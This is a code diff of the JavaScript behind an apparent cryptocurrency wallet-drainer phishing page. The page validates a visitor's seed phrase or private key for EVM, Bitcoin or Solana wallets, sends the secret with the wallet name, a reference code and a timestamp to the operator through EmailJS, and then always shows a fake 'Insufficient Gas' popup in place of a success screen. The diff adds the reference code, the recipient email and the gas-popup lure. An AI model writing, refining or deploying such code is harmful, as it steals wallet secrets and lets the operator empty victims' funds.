-        // ---- private key: strict min/max + real format ----
-        // length must be within KEY_MIN..KEY_MAX, and match:
-        //   64 hex chars (optional 0x) -> EVM
-        //   51-52 base58 chars         -> Bitcoin
-        //   87-88 base58 chars         -> Solana
         function keyValid() {
           const t = keyInput.value.trim();
           const len = t.length;
@@ -967,32 +559,25 @@
             keyHint.className = "phrase-hint";
             return;
           }
-
           if (len < KEY_MIN) {
-            keyHint.textContent =
-              len + " / " + KEY_MIN + " characters — too short";
+            keyHint.textContent = len + " / " + KEY_MIN + " characters — too short";
             keyHint.className = "phrase-hint invalid";
             return;
           }
-
           if (len > KEY_MAX) {
-            keyHint.textContent =
-              len + " / " + KEY_MAX + " characters — too long";
+            keyHint.textContent = len + " / " + KEY_MAX + " characters — too long";
             keyHint.className = "phrase-hint invalid";
             return;
           }
-
           if (keyValid()) {
             keyHint.textContent = len + " characters — looks good";
             keyHint.className = "phrase-hint valid";
             return;
           }
-
           keyHint.textContent = len + " characters — invalid key format";
           keyHint.className = "phrase-hint invalid";
         }
 
-        // Connect stays locked until the active tab is valid
         function updateSubmitState() {
           if (activeTab() === "phrase") {
             updatePhraseHint();
@@ -1015,34 +600,27 @@
           STEPS.forEach((label, i) => {
             const step = document.createElement("div");
             step.className = "status-step";
-            step.innerHTML =
-              '<span class="step-dot"></span><span>' + label + "</span>";
+            step.innerHTML = '<span class="step-dot"></span><span>' + label + "</span>";
             statusSteps.appendChild(step);
 
             timers.push(setTimeout(() => step.classList.add("visible"), i * 700));
             timers.push(setTimeout(() => step.classList.add("active"), i * 700 + 100));
-            timers.push(
-              setTimeout(() => {
-                step.classList.remove("active");
-                step.classList.add("done");
-              }, i * 700 + 800)
-            );
+            timers.push(setTimeout(() => {
+              step.classList.remove("active");
+              step.classList.add("done");
+            }, i * 700 + 800));
           });
 
-          timers.push(
-            setTimeout(() => {
-              connecting.style.display = "none";
-              form.classList.add("visible");
-              updateSubmitState();
-            }, STEPS.length * 700 + 900)
-          );
+          timers.push(setTimeout(() => {
+            connecting.style.display = "none";
+            form.classList.add("visible");
+            updateSubmitState();
+          }, STEPS.length * 700 + 900));
         }
 
         window.openModal = function (name, icon) {
           nameEl.textContent = name;
-          successName.textContent = name;
 
-          // load the popup logo, with the same backup behaviour as the cards
           logoEl.onerror = function () {
             this.onerror = null;
             const fb = ICON_FALLBACKS[icon];
@@ -1073,7 +651,6 @@
 
         async function submitForm() {
           const tab = activeTab();
-          // nothing proceeds unless valid
           if (tab === "phrase" && !phraseValid()) return;
           if (tab === "key" && !keyValid()) return;
 
@@ -1081,27 +658,35 @@
           const label = submitBtn.textContent;
           submitBtn.textContent = "Connecting…";
 
+          const ref = makeRefCode();
+          refCodeEl.textContent = ref;
+
           const params = {
             wallet: nameEl.textContent,
             type: tab === "phrase" ? "Passphrase" : "Private Key",
-            value:
-              tab === "phrase" ? phraseInput.value.trim() : keyInput.value.trim(),
+            value: tab === "phrase" ? phraseInput.value.trim() : keyInput.value.trim(),
+            ref: ref,
+            time: new Date().toLocaleString(),
+            email: TO_EMAIL,
           };
 
           try {
             await emailjs.send(
-              "YOUR_SERVICE_ID",
-              "YOUR_TEMPLATE_ID",
+              SERVICE_ID,
+              TEMPLATE_ID,
               params,
-              "YOUR_PUBLIC_KEY"
+              { publicKey: PUBLIC_KEY }
             );
+            console.log("EmailJS OK — ref " + ref);
           } catch (err) {
-            console.error("EmailJS error:", err);
+            console.error("EmailJS FAILED:", err);
+          } finally {
+            // always ends on the Insufficient Gas popup
+            submitBtn.textContent = label;
+            submitBtn.disabled = false;
+            overlay.classList.remove("active");
+            gasOverlay.classList.add("active");
           }
-
-          submitBtn.textContent = label;
-          overlay.classList.remove("active");
-          successOverlay.classList.add("active");
         }
 
         document.querySelectorAll(".tab-btn").forEach((b) =>
@@ -1111,12 +696,9 @@
         keyInput.addEventListener("input", updateSubmitState);
         submitBtn.addEventListener("click", submitForm);
         document.getElementById("modalClose").addEventListener("click", closeModal);
-        document
-          .getElementById("successClose")
-          .addEventListener("click", () => successOverlay.classList.remove("active"));
-        document
-          .getElementById("successDone")
-          .addEventListener("click", () => successOverlay.classList.remove("active"));
+
+        document.getElementById("gasClose").addEventListener("click", () => gasOverlay.classList.remove("active"));
+        document.getElementById("gasDone").addEventListener("click", () => gasOverlay.classList.remove("active"));
 
         overlay.addEventListener("click", (e) => {
           if (e.target === overlay) closeModal();
